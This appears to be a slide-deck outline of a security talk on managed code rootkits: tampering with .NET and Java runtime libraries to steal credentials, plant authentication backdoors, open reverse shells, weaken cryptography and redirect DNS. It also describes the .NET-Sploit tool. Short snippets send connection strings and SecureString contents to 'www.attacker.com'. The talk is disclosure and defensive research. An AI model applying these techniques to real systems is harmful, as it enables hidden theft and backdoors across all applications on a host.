# Managed Code Rootkits and Runtime Tampering

## Introduction
- **KeyLogEventHandler**:
  - `public void KeyLogEventHandler(Event e)`
  - This method will be used later in the presentation.
  
- **Attacking the “Object” Class**:
  - Object-oriented programming and inheritance play a crucial role.
  - All classes automatically extend the `Object` class, inheriting its member variables and methods.
  - The `Object` class contains generic code shared among all other objects.
  - Injecting a new method into the `Object` class will affect all existing classes.
  - Example: Reporting current object variables to an attacker.
    ```java
    private void SendVariables(String attackerAddress) {
        // Implementation to send variables to the attacker
    }
    ```

## Malware Development Scenarios
- **Manipulating Language Class Libraries**:
  - Code manipulation and API hooking.
  - Authentication backdoors.
  - Sensitive data theft.
  - Resource hiding (files, processes, ports, etc.).
  - Covert channels and reverse shells.
  - Proxy (bouncer), DNS fixation, Man-in-the-Middle (MitM) attacks.
  - Polymorphism attacks.
  - Disabling security mechanisms.
  - Note: These attacks are hidden from applications running inside the sandbox, not from the OS.

### Examples
- **Stealing Authentication Credentials**:
  - Modify the `Authenticate()` method used by all applications.
  - Send credentials to the attacker's URL using `SendToUrl()`.
  - **Demo**: Hooking into `FormsAuthentication::Authenticate()` (.NET/Windows).

- **Authentication Backdoors**:
  - Another attack on the `Authenticate()` method.
  - Conditional authentication bypass.
  - Example: "MagicValue" (Disassemble, Edit, Assemble, Decompile).

- **Reverse Shell**:
  - Encoded version of netcat (MSIL array, drop-and-pop).
  - Deployed as a public method and private class.
  - Example: Trigger on `Application::Run()`.

- **Cryptography Attacks**:
  - Tampering with cryptography libraries.
  - False sense of security.
  - Scenarios:
    - Key fixation and manipulation.
    - Key stealing (e.g., `SendToUrl(attacker, key)`).
    - Algorithm downgrading (AES to DES, etc.).
  - Example: Fixate `GenerateKey()`.

- **DNS Manipulation**:
  - Manipulate DNS queries and responses.
  - Example (Man-in-the-Middle): Fixate the runtime DNS resolver to return a specific IP address controlled by the attacker.
  - **Example**: `InetAddress::getByName(string host)` (Java).
  - All communication is directed to the attacker.
  - Affects all network API methods.
  - **Demo**: `InetAddress::getByName()` conditional IP fixation (JAVA/Linux).

- **Stealing Connection Strings**:
  - Timing is crucial.
  - `SqlConnection::Open()` opens the database connection.
  - `ConnectionString` variable contains the data.
  - Send the connection string to the attacker.
  - **Example**:
    ```java
    public override void Open() {
        SendToUrl("www.attacker.com", this.ConnectionString);
        // Original code starts here
        // ...
    }
    ```

- **Permanent HTML/JS Injection**:
  - Malware can be injected into hard-coded HTML/Javascript templates.
  - Inject permanent code into code templates.
  - Examples: Permanent XSS, proxies, Man-in-the-Middle, defacement, browser exploitation frameworks.
  - **Example**: Inject a permanent call to an XSS shell.

- **Extracting SecureString Data**:
  - In-memory encrypted string for sensitive data usage (.NET).
  - Extract the data and send it to the attacker.
  - **Example**:
    ```csharp
    IntPtr ptr = System.Runtime.InteropServices.Marshal.SecureStringToBSTR(secureString);
    SendToUrl("www.attacker.com", System.Runtime.InteropServices.Marshal.PtrToStringBSTR(ptr));
    ```

- **Disabling Security Mechanisms**:
  - Java JAAS (Java Authentication & Authorization Service) / .NET CAS (Code Access Security) manage runtime code authorizations.
  - Example: Mess with `Demand()`.
  - Effects: Applications will not behave according to declared policy settings.
  - False sense of security.
  - Configuration audit becomes useless.

## Advanced Topics
- **Cross-Platform Modified Classes**:
  - Can run on different platforms.
  - "One class to rule them all, one class to find them, one class to bring them all and in the darkness bind them."
  - Other runtimes: ESB, Web Service stacks, Application Servers, Databases, SilverLight, PowerShell.
  - Behavior can be changed.
  - Multiple, chained rootkits or second-order rootkits.
  - OS-level rootkit covering up traces of MCR (file size, signature, etc.).
  - VM-level MCR covering its traces from the application.

## Automating the Process with .NET-Sploit 1.0
- **General Purpose .NET DLL Modification Tool**:
  - Capable of performing all previous steps.
  - Extract target DLL from the GAC.
  - Perform complex code modifications.
  - Generate GAC deployers.
  - Easy to extend by adding new code modules.
  - Can be used on Linux using Mono.
  - Most discussed attacks have a .NET-Sploit PoC module implementation.

### .NET-Sploit Module Concept
- **Generic Modules**:
  - Function: A new method.
  - Payload: Injected code.
  - Reference: External DLL reference.
  - Item: Injection descriptor.
  - Comes with predefined modules.
  - **Example**: Change `WriteLine()` to print every string twice.
    - Target: `mscorlib.dll`
    - Hooking Point: `WriteLine()`
    - Mode: Post Append
    - Location: `c:\WINDOWS\assembly\GAC_32\mscorlib\2.0.0.0__b77a5c561934e089`
    - **Injected Code**:
      ```csharp
      mscorlib.dll
      c:\WINDOWS\assembly\GAC_32\mscorlib\2.0.0.0__b77a5c561934e089
      writeline_twice.payload
      8
      Post Append
      ```
  - **Demo**: .NET-Sploit targeted reverse shell (.NET).

## Call for Action
- **AV/HIPS Vendors**: Block runtime tampering attempts.
- **IT**: File tampering detectors (external tripwire).
- **Auditors/ Testers**: Be aware of this malware hiding place.
- **Forensics**: Look for evidence inside the runtime VM.
- **Developers**: Your app is only as secure as the underlying runtime VM.
- **VM Vendors**: Raise the bar; it’s too low!
- **End Users**: Verify your runtime libraries!

## References
- More information: [http://www.applicationsecurity.co.il/Managed-Code-Rootkits.aspx](http://www.applicationsecurity.co.il/Managed-Code-Rootkits.aspx)
- Slides and whitepaper.
- .NET-Sploit Tool & Source code.
- .NET-Sploit PoC modules for described attacks.
- Ken Thompson, C compiler backdoors: "Reflections on Trusting Trust" [http://cm.bell-labs.com/who/ken/trust.html](http://cm.bell-labs.com/who/ken/trust.html)
- Dinis Cruz, OWASP.NET: "The dangers of full trust applications" [http://www.owasp.org/index.php/.Net_Full_Trust](http://www.owasp.org/index.php/.Net_Full_Trust)

## Summary
- Malicious code can be hidden inside an application runtime VM.
- It is an alternative place for malware deployment besides the Kernel, BIOS, Drivers, etc.
- It is an alternative place for backdoors.
- Can lead to interesting attacks.
- Does not depend on specific vulnerabilities.
- Not restricted to Java or .NET.
- .NET-Sploit simplifies the process for .NET and can be extended to other platforms.
- .NET-Sploit is not necessarily an evil tool; it can be used to create customized Frameworks.

## Questions
- Any questions?

## Thank You
- Thank you for your attention!

- **Contact Information**:
  - Email: [PI:EMAIL]
  - Material: [http://www.applicationsecurity.co.il/Managed-Code-Rootkits.aspx](http://www.applicationsecurity.co.il/Managed-Code-Rootkits.aspx)